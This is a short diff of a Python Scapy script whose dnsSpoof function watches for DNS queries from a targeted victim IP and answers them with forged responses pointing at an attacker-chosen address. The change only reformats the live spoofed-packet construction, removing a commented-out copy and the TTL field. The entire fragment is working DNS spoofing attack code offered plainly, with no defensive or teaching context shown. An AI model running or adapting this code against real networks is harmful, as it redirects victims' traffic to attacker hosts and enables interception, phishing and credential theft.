@@ -33,14 +33,9 @@ def dnsSpoof(pkt):
     if pkt.haslayer(DNSQR) and pkt[IP].src == ipVictim and pkt[DNS].qr == 0:
         print("[+] Intercepted DNS Query: {}".format(pkt[DNSQR].qname))
         
-#         spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
-#             UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
-#             DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=ipSpoofed))
-        
         spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
-                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
-                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
-                          an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=ipSpoofed))
+            UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
+            DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=pkt[DNSQR].qname, rdata=ipSpoofed))
         
         send(spoofed_pkt, verbose=0)
         print("[+] Sent Spoofed DNS Response: {}".format(spoofed_pkt[DNSRR].rdata))
